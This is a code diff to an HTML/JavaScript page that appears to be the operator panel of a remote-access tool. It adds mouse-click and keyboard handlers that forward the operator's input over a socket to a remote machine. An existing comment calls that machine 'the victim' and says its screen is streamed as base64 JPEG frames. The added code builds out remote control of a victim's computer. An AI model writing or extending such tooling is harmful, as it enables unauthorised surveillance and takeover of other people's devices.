@@ -106,6 +106,58 @@
             // Update the image src with the base64 JPEG from the victim
             screenImg.src = 'data:image/jpeg;base64,' + data.frame;
         });
+
+        // ==========================================
+        // Remote Control Interaction Logic
+        // ==========================================
+        
+        // Helper to calculate relative coordinates
+        function getRelativeCoordinates(e) {
+            const rect = screenImg.getBoundingClientRect();
+            let x = e.clientX - rect.left;
+            let y = e.clientY - rect.top;
+            
+            // Normalize between 0.0 and 1.0
+            return {
+                x_rel: Math.max(0, Math.min(1, x / rect.width)), 
+                y_rel: Math.max(0, Math.min(1, y / rect.height))
+            };
+        }
+
+        // 1. Mouse Click
+        screenImg.addEventListener('mousedown', (e) => {
+            e.preventDefault(); // Stop default browser dragging
+            const coords = getRelativeCoordinates(e);
+            
+            let btn = 'left';
+            if (e.button === 1) btn = 'middle';
+            if (e.button === 2) btn = 'right';
+            
+            socket.emit('input_event', {
+                client_id: uniqueClientId,
+                action: 'mouse_click',
+                button: btn,
+                x_rel: coords.x_rel,
+                y_rel: coords.y_rel
+            });
+        });
+        
+        // Disable right click menu on the video stream
+        screenImg.addEventListener('contextmenu', e => e.preventDefault());
+
+        // 2. Keyboard Input
+        // Must click the window first to focus it before typing
+        window.addEventListener('keydown', (e) => {
+            // Ignore if typing in an input box (if we ever added one)
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+            
+            e.preventDefault(); // Stop scrolling when pressing space/arrows
+            socket.emit('input_event', {
+                client_id: uniqueClientId,
+                action: 'key_press',
+                key: e.key.toLowerCase()
+            });
+        });
     </script>
 </body>
 </html>
